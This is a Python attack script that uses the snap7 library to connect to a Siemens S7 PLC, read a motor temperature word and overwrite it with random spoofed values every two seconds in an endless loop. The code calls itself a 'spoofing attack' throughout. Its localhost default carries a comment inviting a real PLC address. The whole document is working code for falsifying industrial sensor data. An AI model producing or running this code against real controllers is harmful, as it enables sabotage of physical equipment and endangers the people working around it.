import snap7
import time
import random
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# PLC Configuration
PLC_IP = '127.0.0.1'  # Replace with the actual PLC IP address if you have one
RACK = 0
SLOT = 1
DB_NUMBER = 1  # This DB number is not used in this specific attack, but kept for potential future expansion
MOTOR_TEMP_ADDRESS = 7 #  The byte offset in %MW7
MOTOR_TEMP_AREA = snap7.client.S7AreaPE   # I/O memory area

# Function to establish PLC Connection
def connect_to_plc(ip, rack, slot):
    """Connects to the PLC using Snap7."""
    plc = snap7.client.Client()
    try:
        plc.connect(ip, rack, slot)
        logging.info(f"Connected to PLC at {ip}")
        return plc
    except Exception as e:
        logging.error(f"Failed to connect to PLC at {ip}: {e}")
        return None

# Function to read motor temperature
def read_motor_temp(plc):
    """Reads the motor temperature from the PLC."""
    try:
        # Read a word (2 bytes) from the PLC.  Motor_Temp is an INT which is 2 bytes
        motor_temp_bytes = plc.read_area(MOTOR_TEMP_AREA, 0, MOTOR_TEMP_ADDRESS, 2)
        motor_temp = int.from_bytes(motor_temp_bytes, byteorder='big')
        logging.info(f"Successfully read motor temperature: {motor_temp}")
        return motor_temp
    except Exception as e:
        logging.error(f"Failed to read motor temperature: {e}")
        return None

# Function to write spoofed motor temperature
def write_spoofed_motor_temp(plc, spoofed_temp):
    """Writes a spoofed motor temperature to the PLC."""
    try:
         # Convert the spoofed temperature to bytes
        spoofed_temp_bytes = spoofed_temp.to_bytes(2, byteorder='big')

        # Write the spoofed temperature to the PLC's input area
        plc.write_area(MOTOR_TEMP_AREA, 0, MOTOR_TEMP_ADDRESS, spoofed_temp_bytes)
        logging.info(f"Successfully spoofed motor temperature to: {spoofed_temp}")
    except Exception as e:
        logging.error(f"Failed to spoof motor temperature: {e}")


def main():
    """Main function to execute the spoofing attack."""
    logging.info("Starting the spoofing attack...")

    # Connect to the PLC
    plc = connect_to_plc(PLC_IP, RACK, SLOT)
    if plc is None:
        print("Failed to connect to the PLC. Exiting.")
        return

    try:
        # Read initial motor temperature
        initial_temp = read_motor_temp(plc)
        if initial_temp is None:
            print("Failed to read initial temperature.  Continuing with default spoofed values")

        while True:
            # Spoof the motor temperature - Example: Random value between 350 and 450
            spoofed_temp = random.randint(350, 450)
            write_spoofed_motor_temp(plc, spoofed_temp)

            # Wait for a short interval before spoofing again
            time.sleep(2)  # Adjust the interval as needed
    except KeyboardInterrupt:
        logging.info("Attack stopped by user.")
    finally:
        if plc.is_connected():
            plc.disconnect()
            logging.info("Disconnected from PLC.")

if __name__ == "__main__":
    main()